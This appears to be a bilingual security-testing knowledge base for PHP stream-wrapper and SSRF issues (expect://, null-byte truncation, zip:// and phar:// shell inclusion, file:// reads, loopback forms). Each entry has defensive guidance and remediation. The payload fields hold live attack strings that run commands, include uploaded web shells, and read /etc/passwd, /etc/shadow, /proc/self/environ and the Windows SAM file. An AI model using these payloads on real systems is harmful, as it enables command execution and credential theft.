description.zh: 使用三个 expect:// 变体确认 PECL expect 扩展、注册 wrapper 与最终文件 API 是否共同形成命令流边界。
description.en: 使用三个 expect:// 变体确认 PECL expect 扩展、注册 wrapper 与最终文件 API 是否共同形成命令流边界。

prerequisites.zh: 隔离 PHP 实例明确安装 PECL expect，且 stream_get_wrappers 输出包含 expect
prerequisites.en: The isolated PHP instance explicitly has PECL expect installed and stream_get_wrappers lists expect.

prerequisites.zh: 运行身份仅能启动预先批准的无副作用标记程序，并可审计进程创建
prerequisites.en: The runtime identity can start only a preapproved side-effect-free marker program and process creation is auditable.

title.zh: Expect Wrapper 命令流样例

description.zh: 原行保留用于来源核对。执行时统一替换为批准的 marker-helper，禁止运行 id、ls 或读取 /etc/passwd。
description.en: 原行保留用于来源核对。执行时统一替换为批准的 marker-helper，禁止运行 id、ls 或读取 /etc/passwd。

analysis.zh: 完整阳性必须出现由目标 PHP 请求启动的批准 marker-helper 进程及其唯一输出。wrapper 在列表中、URI 被解析、报错内容不同或命令字符串被记录只说明部分前提。
analysis.en: A complete positive requires the approved marker-helper process to be launched by the target PHP request and return its unique output. A listed wrapper, parsed URI, different error, or logged command string proves only a partial prerequisite.

opsecTips.zh: 只允许固定 marker-helper，设置一次执行和超时上限；发现任何其他子进程立即终止 PHP 测试实例
opsecTips.en: Allow only the fixed marker-helper with one-execution and timeout limits; terminate the PHP test instance immediately if any other child appears.

opsecTips.zh: 测试后卸载临时扩展、删除帮助程序和进程审计导出，并确认没有残留子进程
opsecTips.en: After testing remove the temporary extension, helper, and process-audit export, and confirm no child process remains.

title.zh: 验证 Expect 是否真实注册
title.en: Verify that expect is actually registered

description.zh: 从同一 PHP 运行时采集模块、wrapper 列表、文件 API 和运行身份，而非依赖错误信息猜测。
description.en: Collect modules, wrapper list, file API, and runtime identity from the same PHP runtime instead of inferring them from an error.

title.zh: 替换命令后单次触发
title.en: Replace the command and trigger once

description.zh: 把原始三条都映射到同一无副作用帮助程序，仅提交一个带随机令牌的请求。
description.en: 把原始三条都映射到同一无副作用帮助程序，仅提交一个带随机令牌的请求。

attackChain.payload:
expect://id
expect://ls
expect://cat%20/etc/passwd

title.zh: 关联子进程与标记
title.en: Correlate the child process and marker

description.zh: 匹配 PHP 请求、审计进程、帮助程序标准输出和响应，拒绝只依据 wrapper 识别。
description.en: Match the PHP request, audited process, helper stdout, and response, rejecting wrapper recognition alone.

title.zh: 移除扩展并验证阻断
title.en: Remove the extension and verify blocking

description.zh: 禁用 expect 与子进程能力后重放，确认普通读取正常、expect 在调用前拒绝并清理帮助程序。
description.en: After disabling expect and child-process capability, replay to preserve normal reads, reject expect before invocation, and remove the helper.

overview.zh: expect:// 不是 PHP 默认 wrapper，它来自 PECL expect 扩展。没有扩展、没有注册 scheme 或输入未到达流 API 时，原行只是不可执行字符串，因此测试首先是环境能力确认。
overview.en: expect:// 不是 PHP 默认 wrapper，它来自 PECL expect 扩展。没有扩展、没有注册 scheme 或输入未到达流 API 时，原行只是不可执行字符串，因此测试首先是环境能力确认。

vulnerability.zh: 若应用允许用户控制流 URI，expect wrapper 已启用且 PHP 进程可启动命令，文件读取功能可能跨越到进程执行。仅安装扩展或返回 unknown wrapper 错误都不等于存在可利用数据流。
vulnerability.en: If an application lets users control a stream URI while the expect wrapper is enabled and the PHP process can start commands, a file-read feature may cross into process execution. Installing the extension or receiving an unknown-wrapper error alone does not establish an exploitable data flow.

exploitation.zh: 先从服务器侧记录 wrapper 注册与目标 API，再把每条命令替换为只输出随机标记的固定帮助程序。阳性要求请求 ID、PHP 调用、子进程事件和标记响应完整关联；URI 回显、扩展存在或命令文本进入日志均不足。
exploitation.en: 先从服务器侧记录 wrapper 注册与目标 API，再把每条命令替换为只输出随机标记的固定帮助程序。阳性要求请求 ID、PHP 调用、子进程事件和标记响应完整关联；URI 回显、扩展存在或命令文本进入日志均不足。

mitigation.zh: 生产环境卸载或禁用 expect 扩展，拒绝非 file scheme，使用对象 ID 访问固定文件，并限制 PHP 进程创建子进程。修复回归需同时覆盖正常文件读取和隔离 marker-helper。
mitigation.en: Remove or disable the expect extension in production, reject non-file schemes, access fixed files through object identifiers, and prevent the PHP process from spawning children. Regression must cover both normal file reads and the isolated marker-helper case.

name.zh: 旧版 PHP 文件路径空字节截断

description.zh: 使用 URL 编码空字节和后缀组合验证旧版 PHP 或底层 C 文件 API 是否在安全校验与最终打开之间截断路径；现代 PHP 通常拒绝 NUL，必须以实际版本和文件访问证据判定。
description.en: Uses URL-encoded null bytes and suffix combinations to test whether legacy PHP or an underlying C file API truncates a path between validation and final open; modern PHP generally rejects NUL, so findings require version and file-access evidence.

prerequisites.zh: 目标运行时和文件函数版本已确认，并可在允许根目录外放置无敏感测试标记。
prerequisites.en: The runtime and file-function versions are confirmed, with a nonsensitive marker placed outside the allowed root.

prerequisites.zh: 能够关联原始 URL、完全解码值、应用拼接结果、规范路径和文件访问日志。
prerequisites.en: Raw URL, fully decoded value, application-appended path, canonical path, and file-access logs can be correlated.

title.zh: Null字节绕过(老版本PHP)
title.en: Validation step 1 for Legacy PHP File-Path Null-Byte Truncation

description.zh: Null字节绕过(老版本PHP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Legacy PHP File-Path Null-Byte Truncation validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 旧版 PHP 文件路径空字节截断必须按实际数据流判定。阳性必须证明 NUL 后缀在最终文件调用前被截断，并实际读取隔离标记；400/500、NUL 警告、参数回显或旧漏洞文档与目标无关时均为假阳性。还应保存原始值、完全解码或规范值、最终处理器、运行身份和同一请求 ID 的服务端证据，以区分入口接受、静态存储、读取、解析和执行。
analysis.en: Legacy PHP File-Path Null-Byte Truncation must be judged from the actual data flow. A positive requires proof that the suffix after NUL is truncated before the final file call and that the isolated marker is read; 400 or 500 responses, NUL warnings, reflection, or unrelated legacy documentation are false positives. Preserve the raw value, fully decoded or canonical value, final processor, runtime identity, and server evidence for the same request identifier to distinguish entry acceptance, static storage, reading, parsing, and execution.

opsecTips.zh: 验证“旧版 PHP 文件路径空字节截断”时每轮只使用一个固定标记；一旦出现真实敏感数据、非预期解释、进程创建、写入、外连或服务不稳定，立即停止并保留请求 ID。
opsecTips.en: For Legacy PHP File-Path Null-Byte Truncation, use one fixed marker per run; stop immediately and retain the request identifier on real sensitive data, unintended interpretation, process creation, writes, egress, or service instability.

opsecTips.zh: 完成“旧版 PHP 文件路径空字节截断”后删除上传文件、测试归档、标记文件和临时监听器，清理对象存储、CDN 与解析缓存，并按保留策略处理包含标记的日志。
opsecTips.en: After Legacy PHP File-Path Null-Byte Truncation, delete uploads, test archives, marker files, and temporary listeners, clear object-store, CDN, and parser caches, and handle marker-bearing logs under the retention policy.

title.zh: 界定“旧版 PHP 文件路径空字节截断”入口
title.en: Define the Legacy PHP File-Path Null-Byte Truncation entry

description.zh: 定位输入参数、全部解码或规范化层、最终处理器和运行身份，并逐项确认前提“目标运行时和文件函数版本已确认，并可在允许根目录外放置无敏感测试标记。”与“能够关联原始 URL、完全解码值、应用拼接结果、规范路径和文件访问日志。”。
description.en: Locate the input parameter, every decoding or canonicalization layer, the final processor, and runtime identity, then confirm both prerequisites: The runtime and file-function versions are confirmed, with a nonsensitive marker placed outside the allowed root. Raw URL, fully decoded value, application-appended path, canonical path, and file-access logs can be correlated.

title.zh: 建立“路径空字节截断”对照基线
title.en: Establish the Path Null-Byte Truncation control baseline

description.zh: 使用合法业务对象、明确拒绝对象和无敏感固定标记记录响应、规范值、文件或网络事件以及处理器选择，作为后续逐行比较基线。
description.en: Use a valid business object, an explicitly rejected object, and a nonsensitive fixed marker to record response, canonical value, file or network events, and processor selection as the line-by-line baseline.

title.zh: 逐行验证“旧版 PHP 文件路径空字节截断”
title.en: Validate Legacy PHP File-Path Null-Byte Truncation line by line

description.zh: 严格保留原始集合的字节和顺序，每轮只提交一行，并把危险目标替换为隔离标记。按“阳性必须证明 NUL 后缀在最终文件调用前被截断，并实际读取隔离标记；400/500、NUL 警告、参数回显或旧漏洞文档与目标无关时均为假阳性。”判定结果，禁止从字符串命中直接推导漏洞。
description.en: Preserve the original set byte-for-byte and in order, submit one line per run, and replace dangerous targets with isolated markers. Apply this result boundary: A positive requires proof that the suffix after NUL is truncated before the final file call and that the isolated marker is read; 400 or 500 responses, NUL warnings, reflection, or unrelated legacy documentation are false positives.

attackChain.payload:
/etc/passwd%00.php
/etc/passwd%00
index.php%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%00.php

title.zh: 修复并回归“旧版 PHP 文件路径空字节截断”
title.en: Remediate and regress Legacy PHP File-Path Null-Byte Truncation

description.zh: 实施“升级受支持的 PHP，拒绝控制字符和 NUL，完全解码后解析规范绝对路径，并在文件 API 前强制固定根目录。”后，从同一入口重放正常与异常对照；确认业务功能未退化、危险边界不可达，并删除本次测试产生的文件、归档、缓存和关联数据。
description.en: After applying this remediation: Use supported PHP, reject controls and NUL, fully decode and resolve a canonical absolute path, and enforce a fixed root immediately before file access. Replay normal and abnormal controls through the same entry, confirm business behavior remains intact and the dangerous boundary is unreachable, and delete files, archives, caches, and correlated data created by the test.

overview.zh: 旧版 PHP 文件路径空字节截断用于审查URL 解码后的 NUL 是否跨过应用后缀拼接并在底层文件 API 中提前终止路径。使用 URL 编码空字节和后缀组合验证旧版 PHP 或底层 C 文件 API 是否在安全校验与最终打开之间截断路径；现代 PHP 通常拒绝 NUL，必须以实际版本和文件访问证据判定。该条目保留为 Payload，是因为它给出了能直接送入目标参数的完整输入，但仍必须把输入字符串与后端实际处理结果分开。执行前必须满足两个前提：目标运行时和文件函数版本已确认，并可在允许根目录外放置无敏感测试标记。能够关联原始 URL、完全解码值、应用拼接结果、规范路径和文件访问日志。结论应同时记录输入、规范化值、最终处理器与服务端证据。
overview.en: 旧版 PHP 文件路径空字节截断用于审查URL 解码后的 NUL 是否跨过应用后缀拼接并在底层文件 API 中提前终止路径。使用 URL 编码空字节和后缀组合验证旧版 PHP 或底层 C 文件 API 是否在安全校验与最终打开之间截断路径；现代 PHP 通常拒绝 NUL，必须以实际版本和文件访问证据判定。该条目保留为 Payload，是因为它给出了能直接送入目标参数的完整输入，但仍必须把输入字符串与后端实际处理结果分开。执行前必须满足两个前提：目标运行时和文件函数版本已确认，并可在允许根目录外放置无敏感测试标记。能够关联原始 URL、完全解码值、应用拼接结果、规范路径和文件访问日志。结论应同时记录输入、规范化值、最终处理器与服务端证据。

vulnerability.zh: 旧版 PHP 文件路径空字节截断关注的根因不是字符串出现在字典中，而是URL 解码后的 NUL 是否跨过应用后缀拼接并在底层文件 API 中提前终止路径发生安全边界错配。阳性必须证明 NUL 后缀在最终文件调用前被截断，并实际读取隔离标记；400/500、NUL 警告、参数回显或旧漏洞文档与目标无关时均为假阳性。审计时必须标明运行时、操作系统、服务器模块、目标函数和身份权限，不能把旧版本语义或别的技术栈行为套到当前目标。
vulnerability.en: Legacy PHP File-Path Null-Byte Truncation is not vulnerable because a string appears in a dictionary; the root condition is a security-boundary mismatch in whether a decoded NUL bypasses application suffix appending and terminates the path early in the underlying file API. A positive requires proof that the suffix after NUL is truncated before the final file call and that the isolated marker is read; 400 or 500 responses, NUL warnings, reflection, or unrelated legacy documentation are false positives. The review must identify runtime, operating system, server module, target function, and process privileges instead of importing behavior from an obsolete or unrelated stack.

exploitation.zh: 先为旧版 PHP 文件路径空字节截断建立合法业务样例和明确拒绝样例，再保持内容、身份和请求路径不变，每次只替换原命令中的一行。所有系统路径、代码、地址和文件均改为隔离固定标记；关联应用日志、文件审计、处理器跟踪与响应。出现非预期写入、进程创建、外连、权限变化或真实数据返回时立即停止。
exploitation.en: For Legacy PHP File-Path Null-Byte Truncation, establish one valid business sample and one explicit rejection control, then hold content, identity, and request path constant while replacing one source line at a time. Substitute isolated fixed markers for system paths, code, addresses, and files, and correlate application logs, file audit, processor traces, and responses. Stop on any unintended write, process creation, egress, privilege change, or real-data return.

mitigation.zh: 旧版 PHP 文件路径空字节截断的修复策略是：升级受支持的 PHP，拒绝控制字符和 NUL，完全解码后解析规范绝对路径，并在文件 API 前强制固定根目录。修复后从同一入口重放合法样例、最小异常样例和原始逐行集合，确认正常上传或读取功能保留，同时危险解析器、越界目标和可执行路径均不可达；最后清除测试对象、缓存和日志中的固定标记。
mitigation.en: For Legacy PHP File-Path Null-Byte Truncation, remediation is: Use supported PHP, reject controls and NUL, fully decode and resolve a canonical absolute path, and enforce a fixed root immediately before file access. From the same entry, replay the valid sample, minimized abnormal sample, and original line set to preserve normal upload or read behavior while dangerous parsers, out-of-bound targets, and executable paths remain unreachable. Finally remove test objects, caches, and marker-bearing logs.

name.zh: PHP ZIP 与 PHAR 上传归档成员包含
name.en: PHP ZIP and PHAR Uploaded Archive Member Inclusion

description.zh: 使用 zip:// 和 phar:// 指向已上传归档成员，验证文件包含参数是否跨入归档解析器；ZIP 成员解释、PHAR 成员访问与 PHAR 元数据反序列化是不同边界，不能从 URI 接受直接推导 RCE。
description.en: Uses zip:// and phar:// references to members of uploaded archives to test whether a file-inclusion parameter reaches an archive parser; ZIP member interpretation, PHAR member access, and PHAR metadata deserialization are distinct boundaries and URI acceptance does not imply RCE.

subCategory.zh: 上传归档 Wrapper 包含

prerequisites.zh: 隔离环境中可上传只含固定文本成员的 ZIP 或 PHAR，并确认最终磁盘路径。
prerequisites.en: A ZIP or PHAR containing only a fixed text member can be uploaded in isolation, with its final disk path known.

prerequisites.zh: 已确认 PHP 版本、zip/phar wrapper 可用性、目标函数和上传目录执行权限。
prerequisites.en: PHP version, zip and phar wrapper availability, target function, and upload-directory execution permissions are known.

title.zh: LFI结合文件上传(ZIP)

description.zh: LFI结合文件上传(ZIP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: LFI + File Upload (ZIP) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: PHP ZIP 与 PHAR 上传归档成员包含必须按实际数据流判定。阳性按层次判定：成员读取需返回固定标记，代码包含需有无副作用模板标记，PHAR 反序列化还需独立元数据调用证据；上传成功、URI 回显或归档错误都不足。还应保存原始值、完全解码或规范值、最终处理器、运行身份和同一请求 ID 的服务端证据，以区分入口接受、静态存储、读取、解析和执行。
analysis.en: PHP ZIP and PHAR Uploaded Archive Member Inclusion must be judged from the actual data flow. Evidence is tiered: member read needs the fixed marker, code inclusion needs a side-effect-free template marker, and PHAR deserialization needs separate metadata-call evidence; upload success, URI reflection, or archive errors are insufficient. Preserve the raw value, fully decoded or canonical value, final processor, runtime identity, and server evidence for the same request identifier to distinguish entry acceptance, static storage, reading, parsing, and execution.

opsecTips.zh: 验证“PHP ZIP 与 PHAR 上传归档成员包含”时每轮只使用一个固定标记；一旦出现真实敏感数据、非预期解释、进程创建、写入、外连或服务不稳定，立即停止并保留请求 ID。
opsecTips.en: For PHP ZIP and PHAR Uploaded Archive Member Inclusion, use one fixed marker per run; stop immediately and retain the request identifier on real sensitive data, unintended interpretation, process creation, writes, egress, or service instability.

opsecTips.zh: 完成“PHP ZIP 与 PHAR 上传归档成员包含”后删除上传文件、测试归档、标记文件和临时监听器，清理对象存储、CDN 与解析缓存，并按保留策略处理包含标记的日志。
opsecTips.en: After PHP ZIP and PHAR Uploaded Archive Member Inclusion, delete uploads, test archives, marker files, and temporary listeners, clear object-store, CDN, and parser caches, and handle marker-bearing logs under the retention policy.

title.zh: 界定“PHP ZIP 与 PHAR 上传归档成员包含”入口
title.en: Define the PHP ZIP and PHAR Uploaded Archive Member Inclusion entry

description.zh: 定位输入参数、全部解码或规范化层、最终处理器和运行身份，并逐项确认前提“隔离环境中可上传只含固定文本成员的 ZIP 或 PHAR，并确认最终磁盘路径。”与“已确认 PHP 版本、zip/phar wrapper 可用性、目标函数和上传目录执行权限。”。
description.en: Locate the input parameter, every decoding or canonicalization layer, the final processor, and runtime identity, then confirm both prerequisites: A ZIP or PHAR containing only a fixed text member can be uploaded in isolation, with its final disk path known. PHP version, zip and phar wrapper availability, target function, and upload-directory execution permissions are known.

title.zh: 建立“上传归档 Wrapper 包含”对照基线
title.en: Establish the Uploaded Archive Wrapper Inclusion control baseline

description.zh: 使用合法业务对象、明确拒绝对象和无敏感固定标记记录响应、规范值、文件或网络事件以及处理器选择，作为后续逐行比较基线。
description.en: Use a valid business object, an explicitly rejected object, and a nonsensitive fixed marker to record response, canonical value, file or network events, and processor selection as the line-by-line baseline.

title.zh: 逐行验证“PHP ZIP 与 PHAR 上传归档成员包含”
title.en: Validate PHP ZIP and PHAR Uploaded Archive Member Inclusion line by line

description.zh: 严格保留原始集合的字节和顺序，每轮只提交一行，并把危险目标替换为隔离标记。按“阳性按层次判定：成员读取需返回固定标记，代码包含需有无副作用模板标记，PHAR 反序列化还需独立元数据调用证据；上传成功、URI 回显或归档错误都不足。”判定结果，禁止从字符串命中直接推导漏洞。
description.en: Preserve the original set byte-for-byte and in order, submit one line per run, and replace dangerous targets with isolated markers. Apply this result boundary: Evidence is tiered: member read needs the fixed marker, code inclusion needs a side-effect-free template marker, and PHAR deserialization needs separate metadata-call evidence; upload success, URI reflection, or archive errors are insufficient.

attackChain.payload:
zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id
zip://wshell.zip%23shell.php
phar://shell.jpg/shell.php

title.zh: 修复并回归“PHP ZIP 与 PHAR 上传归档成员包含”
title.en: Remediate and regress PHP ZIP and PHAR Uploaded Archive Member Inclusion

description.zh: 实施“禁止用户输入进入 include/require，上传目录保持不可执行且位于 Web 根外，读取接口只接收对象 ID 并拒绝非 file scheme。”后，从同一入口重放正常与异常对照；确认业务功能未退化、危险边界不可达，并删除本次测试产生的文件、归档、缓存和关联数据。
description.en: After applying this remediation: Keep user input out of include or require, store uploads nonexecutable outside the web root, accept object IDs for reads, and reject non-file schemes. Replay normal and abnormal controls through the same entry, confirm business behavior remains intact and the dangerous boundary is unreachable, and delete files, archives, caches, and correlated data created by the test.

overview.zh: PHP ZIP 与 PHAR 上传归档成员包含用于审查上传对象的真实路径、ZIP 井号成员分隔、PHAR 解析行为以及读取函数和 include 的差异。使用 zip:// 和 phar:// 指向已上传归档成员，验证文件包含参数是否跨入归档解析器；ZIP 成员解释、PHAR 成员访问与 PHAR 元数据反序列化是不同边界，不能从 URI 接受直接推导 RCE。该条目保留为 Payload，是因为它给出了能直接送入目标参数的完整输入，但仍必须把输入字符串与后端实际处理结果分开。执行前必须满足两个前提：隔离环境中可上传只含固定文本成员的 ZIP 或 PHAR，并确认最终磁盘路径。已确认 PHP 版本、zip/phar wrapper 可用性、目标函数和上传目录执行权限。结论应同时记录输入、规范化值、最终处理器与服务端证据。
overview.en: PHP ZIP 与 PHAR 上传归档成员包含用于审查上传对象的真实路径、ZIP 井号成员分隔、PHAR 解析行为以及读取函数和 include 的差异。使用 zip:// 和 phar:// 指向已上传归档成员，验证文件包含参数是否跨入归档解析器；ZIP 成员解释、PHAR 成员访问与 PHAR 元数据反序列化是不同边界，不能从 URI 接受直接推导 RCE。该条目保留为 Payload，是因为它给出了能直接送入目标参数的完整输入，但仍必须把输入字符串与后端实际处理结果分开。执行前必须满足两个前提：隔离环境中可上传只含固定文本成员的 ZIP 或 PHAR，并确认最终磁盘路径。已确认 PHP 版本、zip/phar wrapper 可用性、目标函数和上传目录执行权限。结论应同时记录输入、规范化值、最终处理器与服务端证据。

vulnerability.zh: PHP ZIP 与 PHAR 上传归档成员包含关注的根因不是字符串出现在字典中，而是上传对象的真实路径、ZIP 井号成员分隔、PHAR 解析行为以及读取函数和 include 的差异发生安全边界错配。阳性按层次判定：成员读取需返回固定标记，代码包含需有无副作用模板标记，PHAR 反序列化还需独立元数据调用证据；上传成功、URI 回显或归档错误都不足。审计时必须标明运行时、操作系统、服务器模块、目标函数和身份权限，不能把旧版本语义或别的技术栈行为套到当前目标。
vulnerability.en: PHP ZIP and PHAR Uploaded Archive Member Inclusion is not vulnerable because a string appears in a dictionary; the root condition is a security-boundary mismatch in the uploaded object's real path, ZIP hash member delimiter, PHAR parsing behavior, and the distinction between read functions and include. Evidence is tiered: member read needs the fixed marker, code inclusion needs a side-effect-free template marker, and PHAR deserialization needs separate metadata-call evidence; upload success, URI reflection, or archive errors are insufficient. The review must identify runtime, operating system, server module, target function, and process privileges instead of importing behavior from an obsolete or unrelated stack.

exploitation.zh: 先为PHP ZIP 与 PHAR 上传归档成员包含建立合法业务样例和明确拒绝样例，再保持内容、身份和请求路径不变，每次只替换原命令中的一行。所有系统路径、代码、地址和文件均改为隔离固定标记；关联应用日志、文件审计、处理器跟踪与响应。出现非预期写入、进程创建、外连、权限变化或真实数据返回时立即停止。
exploitation.en: For PHP ZIP and PHAR Uploaded Archive Member Inclusion, establish one valid business sample and one explicit rejection control, then hold content, identity, and request path constant while replacing one source line at a time. Substitute isolated fixed markers for system paths, code, addresses, and files, and correlate application logs, file audit, processor traces, and responses. Stop on any unintended write, process creation, egress, privilege change, or real-data return.

mitigation.zh: PHP ZIP 与 PHAR 上传归档成员包含的修复策略是：禁止用户输入进入 include/require，上传目录保持不可执行且位于 Web 根外，读取接口只接收对象 ID 并拒绝非 file scheme。修复后从同一入口重放合法样例、最小异常样例和原始逐行集合，确认正常上传或读取功能保留，同时危险解析器、越界目标和可执行路径均不可达；最后清除测试对象、缓存和日志中的固定标记。
mitigation.en: For PHP ZIP and PHAR Uploaded Archive Member Inclusion, remediation is: Keep user input out of include or require, store uploads nonexecutable outside the web root, accept object IDs for reads, and reject non-file schemes. From the same entry, replay the valid sample, minimized abnormal sample, and original line set to preserve normal upload or read behavior while dangerous parsers, out-of-bound targets, and executable paths remain unreachable. Finally remove test objects, caches, and marker-bearing logs.

name.zh: SSRF File URI 本地资源读取

description.zh: 使用 Linux 与 Windows 的九个 file:// 目标验证服务端 URL 获取器是否越过网络资源边界读取本地文件。
description.en: 使用 Linux 与 Windows 的九个 file:// 目标验证服务端 URL 获取器是否越过网络资源边界读取本地文件。

prerequisites.zh: 已确认请求由应用服务器发起，且可记录 URL 解析后的 scheme 与最终文件调用
prerequisites.en: The request is confirmed to originate from the application server, and the parsed scheme and final file call are observable.

prerequisites.zh: Linux 与 Windows 测试实例只提供无敏感随机标记文件，禁止访问原始系统路径
prerequisites.en: Linux and Windows test instances expose only nonsensitive random-marker files, and original system paths are off limits.

title.zh: 跨平台 File URI 目标

execution.command:
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/version
file:///var/log/apache2/access.log
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/repair/SAM

description.zh: 原始路径只用于审计追溯。执行前按操作系统改写到隔离标记文件，每次只提交一个 file URI。
description.en: The original paths are retained only for audit traceability. Before execution, rewrite them to an isolated marker file for the relevant operating system and submit one file URI at a time.

analysis.zh: 有效证据要求目标应用进程实际读取隔离本地文件并把唯一标记返回到同一请求。file URI 被接受、错误中出现路径、DNS 没有发生或测试浏览器能打开文件都不足以确认服务端本地读取。
analysis.en: 有效证据要求目标应用进程实际读取隔离本地文件并把唯一标记返回到同一请求。file URI 被接受、错误中出现路径、DNS 没有发生或测试浏览器能打开文件都不足以确认服务端本地读取。

opsecTips.zh: 执行前把九个敏感路径全部映射为专用标记文件；任何真实内容出现即停止并升级数据处理
opsecTips.en: Map all nine sensitive paths to dedicated marker files before execution; stop immediately and escalate data handling if any real content appears.

opsecTips.zh: 测试结束删除两种平台的标记文件、响应副本和文件审计导出，并确认未触碰原路径
opsecTips.en: At completion delete marker files, response copies, and file-audit exports from both platforms, and confirm the original paths were untouched.

title.zh: 建立服务端 HTTPS 获取基线
title.en: 建立服务端 HTTPS 获取基线

description.zh: 用唯一令牌确认请求源、重定向行为和响应处理均属于目标应用。
description.en: Use a unique token to confirm request origin, redirect behavior, and response handling belong to the target application.

title.zh: 改写并提交单个 File URI
title.en: Rewrite and submit one file URI

description.zh: 把系统路径改为对应平台的随机标记文件，每轮仅测试一个保留变体。
description.en: Replace the system path with the platform-specific random-marker file and test only one preserved variant per run.

attackChain.payload:
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/version
file:///var/log/apache2/access.log
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/repair/SAM

title.zh: 关联本地读取与响应标记
title.en: Correlate the local read and response marker

description.zh: 匹配规范化路径、文件审计、应用请求 ID 和返回标记，排除浏览器或代理读取。
description.en: Match canonical path, file audit, application request ID, and returned marker while excluding browser or proxy reads.

title.zh: 收紧 Scheme 并清除标记

description.zh: 修复后重放 HTTPS 基线与 file URI，确认前者正常而后者在文件调用前拒绝，再删除标记文件。
description.en: After remediation replay the HTTPS baseline and file URI, preserving the former and rejecting the latter before any file call, then delete marker files.

overview.zh: file URI 让通用 URL 接口指向本地文件而不是远程主机。是否可读取取决于客户端支持、运行系统、目标 API 和进程权限，因此必须与 HTTP SSRF 分开验证。
overview.en: A file URI points a generic URL interface at a local file rather than a remote host. Readability depends on client support, operating system, target API, and process privileges, so it must be evaluated separately from HTTP SSRF.

vulnerability.zh: 若应用接受任意 scheme 并把用户 URL 交给支持 file 的获取器，原本只应访问远程业务资源的功能可能读取本机数据。scheme 被解析、路径存在或错误信息泄露都不等于文件内容已返回。
vulnerability.en: If an application accepts arbitrary schemes and passes a user URL to a file-capable fetcher, a feature intended only for remote business resources may read local data. A parsed scheme, existing path, or informative error does not mean file content was returned.

exploitation.zh: 先用受控 HTTPS 标记端点证明服务端获取基线，再将一条原始 file URI 的路径替换为本地随机标记文件。只有应用响应包含标记且文件审计显示同一请求 ID 的本地读取才算阳性；客户端读取、静态回显和权限错误均排除。
exploitation.en: 先用受控 HTTPS 标记端点证明服务端获取基线，再将一条原始 file URI 的路径替换为本地随机标记文件。只有应用响应包含标记且文件审计显示同一请求 ID 的本地读取才算阳性；客户端读取、静态回显和权限错误均排除。

mitigation.zh: URL 获取器仅允许必要的 http/https，在解析后和每次重定向后校验 scheme 与目标；文件功能使用对象 ID 和固定根目录。网络获取与本地文件读取应由不同服务身份承担。
mitigation.en: Allow only required http and https schemes in the URL fetcher and validate after parsing and every redirect; file features should use object identifiers and a fixed root. Network retrieval and local file reading should run under separate service identities.

name.zh: SSRF 回环地址规范化差异

description.zh: 使用 IPv4、IPv6、八进制、十六进制、整数、缩写和 DNS 名称验证解析器是否把不同表示统一识别为回环或本地目标。
description.en: Uses IPv4, IPv6, octal, hexadecimal, integer, shorthand, and DNS names to test whether parsers consistently classify alternate forms as loopback or local destinations.

subCategory.zh: 回环地址解析与规范化

prerequisites.zh: 隔离主机仅在一个固定端口运行返回随机标记的回环 HTTP 服务
prerequisites.en: An isolated host runs a loopback HTTP service returning a random marker on one fixed port only.

prerequisites.zh: 可记录应用使用的 URL 解析器、DNS 结果、最终 socket 地址和重定向链
prerequisites.en: The application's URL parser, DNS results, final socket address, and redirect chain are observable.

title.zh: 回环与特殊地址表示

description.zh: 在隔离环境给每行补上同一固定测试端口并逐条请求；公共 DNS 名称应先替换为自有记录，禁止扫描其他本地端口。
description.en: Append the same fixed test port to each line in isolation and request them individually; replace public DNS names with controlled records first and never scan other local ports.

analysis.zh: 确认 SSRF 绕过需要校验阶段接受某一表示、连接库把它规范化为回环、隔离监听器收到带唯一令牌的应用请求。仅 DNS 返回 127.0.0.1、解析器显示数值等价或响应超时都只是部分证据。
analysis.en: Confirming an SSRF bypass requires validation to accept a form, the connection library to canonicalize it to loopback, and the isolated listener to receive an application request with the unique token. DNS returning 127.0.0.1, numeric equivalence in a parser, or a timeout is only partial evidence.

opsecTips.zh: 仅开放一个无敏感标记端口，任何变体首次连接后停止该轮；禁止枚举本地服务
opsecTips.en: Expose only one nonsensitive marker port and stop that run after the first connection from any form; never enumerate local services.

opsecTips.zh: 删除自有 DNS 记录、关闭监听器并清理请求令牌；公共 nip.io/localtest.me 不用于真实执行
opsecTips.en: Delete controlled DNS records, close the listener, and remove request tokens; do not use public nip.io or localtest.me during actual execution.

title.zh: 部署单端口回环标记服务
title.en: Deploy a single-port loopback marker service

description.zh: 服务只返回随机常量，并记录源地址、Host、请求令牌和时间。
description.en: The service returns only a random constant and records source address, Host, request token, and time.

title.zh: 逐个重放地址表示
title.en: Replay address forms one at a time

description.zh: 为每条输入使用新令牌和同一端口，保留原始字符串与解析/连接记录。
description.en: Use a new token and the same port for each input, preserving the original string and parse or connection records.

title.zh: 核对最终 Socket 目的地

description.zh: 把应用日志、DNS、规范地址和监听器请求关联，区分被拒解析与真实本地连接。
description.en: Correlate application logs, DNS, canonical address, and listener request to distinguish rejected parsing from a real local connection.

title.zh: 统一地址分类并回归

description.zh: 修复后重放外部允许地址和全部回环表示，确认仅前者到达并关闭测试端口。
description.en: After remediation replay an allowed external address and every loopback form, confirm only the former arrives, and close the test port.

overview.zh: 同一个回环地址可被表示为字面 IPv4、IPv6、非十进制整数、缩写或解析到本地的主机名。字符串允许列表若早于标准解析与地址分类执行，容易与实际连接目标不一致。
overview.en: The same loopback destination can be represented as literal IPv4, IPv6, nondecimal integers, shorthand, or a hostname resolving locally. String allowlists applied before standard parsing and address classification can disagree with the actual connection target.

vulnerability.zh: 根因是校验器和连接库使用不同解析规则，或应用只拒绝少量字面字符串而不检查解析后的全部 A/AAAA 地址。解析结果为回环并不自动证明连接成功，还需要目标服务收到应用来源请求。
vulnerability.en: The root cause is divergent parsing between validation and connection libraries, or rejection of a few literals without checking every resolved A and AAAA address. A loopback parse alone does not prove a connection; the target service must receive an application-origin request.

